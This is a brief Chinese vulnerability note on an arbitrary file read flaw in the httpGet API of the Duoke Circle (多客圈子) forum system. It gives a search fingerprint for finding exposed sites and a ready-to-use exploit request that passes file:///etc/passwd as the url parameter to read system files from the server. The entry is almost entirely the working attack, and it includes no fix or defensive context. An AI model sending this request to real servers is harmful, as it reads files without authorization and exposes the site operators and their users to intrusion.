# 多客圈子论坛系统httpGet接口处存在任意文件读取漏洞

多客圈子论坛系统httpGet接口处 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/static/index/js/jweixin-1.2.0.js"`
- **请求**：`GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1`